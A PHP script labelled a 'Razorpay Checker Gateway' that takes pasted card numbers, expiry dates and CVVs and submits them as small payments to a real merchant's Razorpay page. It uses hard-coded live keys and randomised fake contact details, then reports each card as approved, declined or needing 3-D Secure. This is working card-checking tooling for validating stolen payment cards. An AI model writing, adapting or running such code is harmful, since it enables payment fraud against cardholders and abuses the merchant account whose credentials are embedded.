<?php
// Razorpay Checker Gateway
// Receives card via POST and returns result

header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$siteUrl = $_POST['site'] ?? $_GET['site'] ?? 'https://razorpay.me/@azhimukham';
$amount = intval($_POST['amount'] ?? $_GET['amount'] ?? 1) * 100; // Convert to paise

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

// Parse card details
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

// Basic validation
if (!preg_match('/^\d{13,19}$/', trim($cardNumber))) {
    echo "DECLINED: Incorrect card number";
    exit;
}

$month = intval(trim($month));
if ($month < 1 || $month > 12) {
    echo "DECLINED: Invalid month";
    exit;
}

$year = intval(trim($year));
$currentYear = intval(date('Y'));
$fullYear = $year < 100 ? 2000 + $year : $year;

if ($fullYear < $currentYear || ($fullYear == $currentYear && $month > intval(date('m')))) {
    echo "DECLINED: Card expired";
    exit;
}

if (!preg_match('/^\d{3,4}$/', trim($cvv))) {
    echo "DECLINED: Invalid CVV";
    exit;
}

// Extract merchant handle from URL
$merchantHandle = '';
if (preg_match('/razorpay\.me\/@([^\/\?]+)/', $siteUrl, $matches)) {
    $merchantHandle = $matches[1];
}

// Pre-defined merchant data (fallback)
$merchants = [
    'azhimukham' => [
        'key_id' => 'rzp_live_hrgl3RDoNMvCOs',
        'keyless_header' => 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
        'payment_link_id' => 'pl_OzLkvRvf1drPps',
        'payment_page_item_id' => 'ppi_OzLkvSvf1drPpt'
    ],
    'testmerchant' => [
        'key_id' => 'rzp_test_xxx',
        'keyless_header' => 'test_header',
        'payment_link_id' => 'pl_test',
        'payment_page_item_id' => 'ppi_test'
    ]
];

$merchant = $merchants[$merchantHandle] ?? $merchants['azhimukham'];

// Get dynamic session token using curl
function getSessionToken() {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36');
    $response = curl_exec($ch);
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);
    
    parse_str(parse_url($finalUrl, PHP_URL_QUERY), $params);
    return $params['session_token'] ?? null;
}

$sessionToken = getSessionToken();
if (!$sessionToken) {
    echo "DECLINED: Could not get session token";
    exit;
}

// Create order
$orderUrl = "https://api.razorpay.com/v1/payment_pages/{$merchant['payment_link_id']}/order";
$orderPayload = json_encode([
    'notes' => ['comment' => ''],
    'line_items' => [
        ['payment_page_item_id' => $merchant['payment_page_item_id'], 'amount' => $amount]
    ]
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $orderUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $orderPayload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json',
    'Content-Type: application/json',
    'User-Agent: Mozilla/5.0'
]);
$response = curl_exec($ch);
curl_close($ch);

$orderData = json_decode($response, true);
$orderId = $orderData['order']['id'] ?? null;

if (!$orderId) {
    echo "DECLINED: Failed to create order";
    exit;
}

// Submit payment
$paymentUrl = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax";
$paymentParams = http_build_query([
    'key_id' => $merchant['key_id'],
    'session_token' => $sessionToken,
    'keyless_header' => $merchant['keyless_header']
]);

$randomPhone = '98765' . rand(10000, 99999);
$randomEmail = 'user' . rand(100, 999) . '@gmail.com';

$paymentData = http_build_query([
    'notes[comment]' => '',
    'payment_link_id' => $merchant['payment_link_id'],
    'key_id' => $merchant['key_id'],
    'callback_url' => 'https://your-server.com/callback',
    'contact' => '+91' . $randomPhone,
    'email' => $randomEmail,
    'currency' => 'INR',
    'amount' => $amount,
    'order_id' => $orderId,
    'method' => 'card',
    'card[number]' => $cardNumber,
    'card[cvv]' => $cvv,
    'card[name]' => 'Test User',
    'card[expiry_month]' => str_pad($month, 2, '0', STR_PAD_LEFT),
    'card[expiry_year]' => substr($fullYear, -2),
    'save' => '0'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $paymentUrl . '?' . $paymentParams);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $paymentData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'x-session-token: ' . $sessionToken,
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0'
]);
$response = curl_exec($ch);
curl_close($ch);

$paymentResult = json_decode($response, true);

// Parse result
if (isset($paymentResult['payment_id'])) {
    echo "APPROVED: Payment successful - ID: " . $paymentResult['payment_id'];
} elseif (isset($paymentResult['razorpay_payment_id'])) {
    echo "APPROVED: Payment successful - ID: " . $paymentResult['razorpay_payment_id'];
} elseif (isset($paymentResult['redirect']) && $paymentResult['redirect'] === true) {
    echo "3DS: 3D Secure authentication required";
} elseif (isset($paymentResult['error'])) {
    $errorMsg = $paymentResult['error']['description'] ?? $paymentResult['error']['message'] ?? 'Payment failed';
    if (stripos($errorMsg, 'insufficient') !== false) {
        echo "DECLINED: Insufficient funds";
    } elseif (stripos($errorMsg, 'expired') !== false) {
        echo "DECLINED: Card expired";
    } elseif (stripos($errorMsg, 'cvv') !== false) {
        echo "DECLINED: Invalid CVV";
    } elseif (stripos($errorMsg, 'declined') !== false) {
        echo "DECLINED: Card declined";
    } else {
        echo "DECLINED: " . $errorMsg;
    }
} else {
    echo "DECLINED: Payment processing failed";
}
?>